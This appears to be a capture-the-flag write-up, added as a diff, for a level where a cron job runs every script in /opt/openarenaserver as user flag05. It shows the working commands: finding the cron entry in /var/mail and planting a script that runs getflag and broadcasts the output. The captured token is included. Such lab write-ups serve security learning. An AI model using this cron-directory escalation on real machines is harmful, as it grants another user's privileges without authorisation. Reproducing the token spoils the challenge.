@@ -1,0 +1,45 @@
+ls gives nothing
+
+find / -user flag05 -printf "%M %u %g %p\n" 2>/dev/null | grep -v proc
+ -rwxr-x--- flag05 flag05 /usr/sbin/openarenaserver
+ -rwxr-x--- flag05 flag05 /rofs/usr/sbin/openarenaserver
+
+cat /rofs/usr/sbin/openarenaserver 
+ cat: /rofs/usr/sbin/openarenaserver: Permission denied
+
+cat /usr/sbin/openarenaserver 
+ #!/bin/sh
+
+ for i in /opt/openarenaserver/* ; do
+         (ulimit -t 5; bash -x "$i")
+         rm -f "$i"
+ done
+
+shell scrit that runs all shell scripts in /opt/openarenaserver and then deletes them
+though, it has no SUID perms plus we can't run it
+
+ps aux | grep openarenaserver
+ level05   8451  0.0  0.0   4380   816 pts/0    S+   10:39   0:00 grep --color=auto openarenaserver
+ 
+we can see in the status column (S+) that the process is sleeping and waiting for an event
+
+ls /var/mail
+ level05
+
+cat /var/mail/level05 
+ */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+this mail indicates a cron task is active on this machine, that executes every two minutes
+it runs openarenaserver with the privileges of the flag05 user
+
+so we just have to put a shell script in /opt/openarenaserver that will run getflag and save the output somewhere :
+
+echo "wall <<< \$(getflag)" > /opt/openarenaserver/getflag
+chmod +x /opt/openarenaserver/getflag
+
+*WAIT 2 MINUTES*
+
+Broadcast Message from flag05@Snow                                             
+        (somewhere) at 11:06 ...                                               
+                                                                               
+Check flag.Here is your token : viuaaale9huek52boumoomioc
